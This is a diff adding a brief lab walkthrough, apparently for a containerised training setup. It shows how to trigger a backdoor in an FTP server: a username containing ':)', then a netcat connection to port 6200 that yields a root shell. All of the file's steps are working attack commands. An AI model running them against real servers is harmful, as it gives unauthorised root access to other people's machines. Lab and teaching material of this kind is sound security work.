@@ -1,0 +1,10 @@
+Steps :
+
+* run the containers (consult README.txt for more information)
+* open a terminal on the host machine and execute this command :
+	netcat 192.168.2.1 21
+* type "USER x:)" and then "PASS <anything>"
+* open another terminal on the host machine and execute this command :
+	netcat 192.168.2.1 6200 -p <port_1_to_1023>
+* you are now root on a remote shell on the ftp machine, type any sh command
+
